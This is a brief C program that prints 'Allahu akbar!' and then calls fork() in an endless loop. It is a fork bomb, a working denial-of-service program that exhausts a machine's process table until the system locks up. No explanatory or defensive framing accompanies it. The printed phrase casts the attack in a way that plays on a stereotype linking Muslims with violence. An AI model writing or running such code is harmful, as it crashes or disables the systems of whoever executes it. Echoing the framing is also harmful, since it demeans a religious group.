#include <assert.h>
#include <stdio.h>
#include <unistd.h>

int main() {
    puts("Allahu akbar!");
    for (;;) {
        assert(fork() != -1);
    }
    return 0;
}